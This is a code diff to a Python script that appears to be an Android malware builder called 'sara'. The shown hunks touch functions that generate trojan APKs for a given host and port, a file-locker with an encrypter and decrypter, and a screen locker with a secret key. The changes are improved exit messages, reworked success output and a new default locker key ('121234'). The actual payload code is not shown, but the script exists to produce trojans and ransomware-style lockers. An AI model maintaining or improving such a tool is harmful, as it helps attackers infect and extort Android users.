@@ -314,7 +314,8 @@ class __sara__:
         apps = recompile(path)
         apps = uber_apk_signer(apps)
         upload_file(apps)
-        if not os.path.isfile(apps): exit
+        if not os.path.isfile(apps): exit(f'\n{sara} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
+        prints(f'''
 {sara} : your trojan apps successfully created
          the application is saved as \'{g}{apps}{w}\'
          
@@ -355,7 +356,8 @@ class __sara__:
         ''')
         file = generate_infected_trojan(host, port, orig)
         upload_file(file)
-        if not os.path.isfile(file): exit
+        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
+        prints(f'''
 {sara} : your trojan apps successfully created
          the application is saved as \'{g}{file}{w}\'
          
@@ -397,7 +399,8 @@ class __sara__:
         ''')
         file = genertare_file_locker(name, desc, icon)
         os.system(f'cp -r data/tmp/decrypter.apk .')
-        if not os.path.isfile(file): exit
+        if not os.path.isfile(file): exit(f'\n{sara} : sorry, failed to build \'{d}{file}{w}\' :( \n')
+        prints(f'''
 {sara} : your file locker apps successfully created
          the encrypter is saved as \'{g}{file}{w}\'
          the decrypter is saved as \'{g}decrypter.apk{w}\'
@@ -423,14 +426,15 @@ class __sara__:
         icon = str(input(f'         set app icon: '))
         if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
         keys = str(input(f'         set app keys: '))
-        if not keys: keys = 's3cr3t'
+        if not keys: keys = '121234'
         prints(f'''
 {sara} : well this process takes a few minutes,
          please be patient until the process is complete 
         ''')
         file = genertare_screen_locker(name, head, desc, keys, icon)
         if not os.path.isfile(file): exit
-        {sara} : your screen locker apps successfully created
+        
+{sara} : your screen locker apps successfully created
          the application is saved as \'{g}{file}{w}\'
          the secret key (passprhase) \'{g}{keys}{w}\'
         ''')
